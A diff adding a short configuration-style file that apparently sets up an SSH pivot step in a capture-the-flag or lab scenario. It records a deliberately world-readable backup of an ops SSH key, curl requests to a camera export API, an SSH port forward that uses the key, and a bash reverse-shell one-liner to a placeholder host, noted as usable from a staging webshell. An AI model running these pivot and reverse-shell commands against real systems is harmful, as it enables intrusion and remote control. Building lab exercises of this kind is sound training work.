@@ -1,0 +1,14 @@
+# SSH pivot lane (post-clearance)
+# Misconfiguration: backup copy of ops key is world-readable (id_ops.leak)
+
+user=ops
+port=22
+auth=publickey
+key_primary=/opt/omega/ops/ssh/id_ops
+key_leak=/opt/omega/ops/ssh/id_ops.leak
+
+from_ops_shell=curl -fsS "http://cctv:8080/api/export.php?id=int-cam3-offline&scope=legacy&as=ops"
+from_host_forward=ssh -i id_ops -N -L 18082:cctv:8080 ops@127.0.0.1 -p ${PIVOT_SSH_PORT}
+then=curl -fsS "http://127.0.0.1:18082/api/export.php?id=int-cam3-offline&scope=legacy&as=ops"
+
+reverse_shell_note=bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'  # depuis webshell staging si autorisé sortant
